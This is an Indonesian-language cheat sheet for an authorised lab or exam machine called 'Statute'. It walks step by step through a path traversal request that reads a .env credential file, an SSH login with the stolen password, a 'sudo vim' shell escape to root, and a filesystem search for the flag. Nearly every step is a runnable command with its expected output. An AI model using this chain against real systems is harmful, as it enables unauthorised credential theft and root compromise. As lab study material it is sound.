# Statute Close Book — Path Traversal to sudo vim Root

> Untuk ujian/lab berizin.  
> Fokus: `.env` → SSH → `sudo vim` → root → cari flag.  
> Tidak memakai cleanup pada alur utama.

---

## Data Hafalan

```text
TARGET      = 192.168.56.120
WEB         = http://192.168.56.120:8080
Celah awal  = Path Traversal parameter file
File target = ../.env
User SSH    = operator
Privesc     = sudo vim
Cari flag   = find / -type f -iname "*flag*" 2>/dev/null
```

Inti celah:

```text
/download?file=../.env membaca file environment aplikasi
.env berisi credential operator
operator bisa SSH
sudo -l menunjukkan /usr/bin/vim
Vim punya shell escape
shell escape dari sudo vim menjadi root
setelah root, cari flag dengan find
```

---

## 1. Set target

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"
```

## 2. Ambil credential dari `.env`

```bash
curl --path-as-is -s \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

Expected:

```text
DB_USERNAME=operator
DB_PASSWORD=<PASSWORD_DARI_ENV>
```

## 3. SSH sebagai operator

```bash
ssh operator@"$TARGET"
```

Masukkan password dari `DB_PASSWORD`.

Cek:

```bash
whoami
id
hostname
```

Expected:

```text
operator
statute
```

## 4. Cek sudo

```bash
sudo -l
```

Expected:

```text
(root) /usr/bin/vim
```

atau:

```text
(root) NOPASSWD: /usr/bin/vim
```

## 5. Root via Vim

Cara tercepat:

```bash
sudo vim -c ':!/bin/sh'
```

Di shell yang terbuka:

```bash
whoami
id
```

Expected:

```text
root
uid=0(root)
```

## 6. Cari flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

Catat path yang muncul.

## 7. Baca flag dari path yang ditemukan

```bash
cat /PATH/FLAG
```

---

# Cheat Sheet Paling Pendek

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

curl --path-as-is -s -H 'User-Agent: Mozilla/5.0' "$WEB/download?file=../.env"

ssh operator@"$TARGET"
# password dari DB_PASSWORD

sudo -l
sudo vim -c ':!/bin/sh'

whoami
id
find / -type f -iname "*flag*" 2>/dev/null
cat /PATH/FLAG
```

---

## Kalau `sudo vim -c ':!/bin/sh'` kurang nyaman

```bash
sudo vim
```

Di dalam Vim:

```vim
:!/bin/bash
```
